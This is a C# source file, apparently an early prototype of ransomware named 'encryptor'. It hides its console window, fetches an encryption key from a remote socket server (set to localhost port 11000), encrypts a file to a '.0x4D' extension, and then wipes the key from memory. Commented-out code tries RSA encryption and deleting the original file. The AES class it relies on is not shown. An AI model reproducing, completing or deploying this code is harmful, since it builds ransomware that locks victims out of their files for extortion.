using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.ComponentModel;
using System.Security;
using System.Net;
using System.Net.Sockets;





namespace encryptor
{
    class Program
    {




        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {

            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);
            ////////////////////////////////////////////////////////////////////////////////////////////////////////
            // <الكود دا شغال برضو >

            string key = StartClient();

            /* [DllImport("kernal32.dll")]
             static extern void extern SecureZeroMemory(&key , key.Length);*/
            // For additional security Pin the password of your files
            //  GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);

            // Encrypt the file
            //  AES2.FileEncrypt("test.txt", password);
            AES2 d = new AES2();
            d.FileEncrypt("plaintest.txt", key);

            //             d.FileDecrypt("plaintest.txt.0x4D", "plaintest.txt", key);
            key = null;
            GC.Collect();
            // To increase the security of the encryption, delete the given password from the memory !


            // You can verify it by displaying its value later on the console (the password won't appear)
            Console.WriteLine("The given password is surely nothing: " + key);


            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            /*  byte[] key = Encoding.ASCII.GetBytes("mohamed_adel0100");
             //  AES.EncryptFile("test.txt", key);
              AES.DecryptFile("test.txt" , key);
              Console.WriteLine("==================finished=================");

                                                          "الكود دا شغال"
  */
            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            /*

                //  using FileStream fs = File.OpenWrite("newimg.0x4D");
                var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_SHOW);
            //Console.ReadLine();
            daata:
            UnicodeEncoding ByteConverter = new UnicodeEncoding();
            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(4096);
            byte[] plaintext;
            byte[] encryptedtext;

            plaintext = File.ReadAllBytes("test.txt");
            // plaintext =  ByteConverter.GetBytes("test.txt");
          
            encryptedtext = Encryption(plaintext, RSA.ExportParameters(false), false);

            if (encryptedtext == null)
            {
                Console.WriteLine("===================we can nt encrypt this file size ====================");
                goto daata;
            }
           // byte[] pubkey = RSA.ExportRSAPublicKey();

         *//*   foreach (var item in encryptedtext)
            {
                fs.WriteByte(item);
            }
            *//*

             File.WriteAllBytes("newtest.0x4D",encryptedtext);

           // File.Delete("test.txt");
            
           // fs.Write(encryptedtext);
            // File.rea
            Console.WriteLine(encryptedtext);

           byte[] fdata =  File.ReadAllBytes("newtest.0x4D");

            byte[] decryptedtex = Decryption(fdata, RSA.ExportParameters(true), false);
            //string ffdata = ByteConverter.GetString(decryptedtex);
            File.WriteAllBytes("test3.txt",decryptedtex);
            Console.WriteLine(decryptedtex);*/
            Thread.Sleep(50000);

        }



        /*   static public byte[] Encryption(byte[] Data, RSAParameters RSAKey, bool DoOAEPPadding)
           {
               try
               {
                   byte[] encryptedData;
                   using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(4096))
                   {
                       RSA.ImportParameters(RSAKey);
                       encryptedData = RSA.Encrypt(Data, DoOAEPPadding);
                   }
                   return encryptedData;
               }
               catch (CryptographicException e)
               {
                   Console.WriteLine(e.Message);
                   return null;
               }
           }
   */



        /*static public byte[] Decryption(byte[] Data, RSAParameters RSAKey, bool DoOAEPPadding)
        {
            try
            {
                byte[] decryptedData;
                using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
                {
                    RSA.ImportParameters(RSAKey);
                    decryptedData = RSA.Decrypt(Data, DoOAEPPadding);
                }
                
                return decryptedData;
            }
            catch (CryptographicException e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }*/




        public static string StartClient()
        {
            string pass = "";
            byte[] bytes = new byte[1024];

            try
            {
                // Connect to a Remote server
                // Get Host IP Address that is used to establish a connection
                // In this case, we get one IP address of localhost that is IP : 127.0.0.1
                // If a host has multiple addresses, you will get a list of addresses
                IPHostEntry host = Dns.GetHostEntry("localhost");
                IPAddress ipAddress = host.AddressList[1];
                IPEndPoint remoteEP = new IPEndPoint(ipAddress, 11000);

                // Create a TCP/IP  socket.
                Socket sender = new Socket(ipAddress.AddressFamily,
                    SocketType.Stream, ProtocolType.Tcp);

                // Connect the socket to the remote endpoint. Catch any errors.
                try
                {
                    // Connect to Remote EndPoint
                    sender.Connect(remoteEP);

                    Console.WriteLine("Socket connected to {0}",
                        sender.RemoteEndPoint.ToString());

                    // Encode the data string into a byte array.
                    // byte[] msg = Encoding.ASCII.GetBytes("This is a test<EOF>");

                    Console.WriteLine("wait for password :");

                    // Send the data through the socket.
                    //  int bytesSent = sender.Send(msg);

                    // Receive the response from the remote device.
                    int bytesRec = sender.Receive(bytes);
                    //  Console.WriteLine("Echoed test = {0}",
                    //    Encoding.ASCII.GetString(bytes, 0, bytesRec));
                    pass = Encoding.ASCII.GetString(bytes, 0, bytesRec);



                    // Release the socket.
                    sender.Shutdown(SocketShutdown.Both);
                    sender.Close();
                    return pass;

                }
                catch (ArgumentNullException ane)
                {
                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
                    return pass;
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                    return pass;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                    return pass;
                }


                return pass;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                return pass;
            }
        }
    }
}

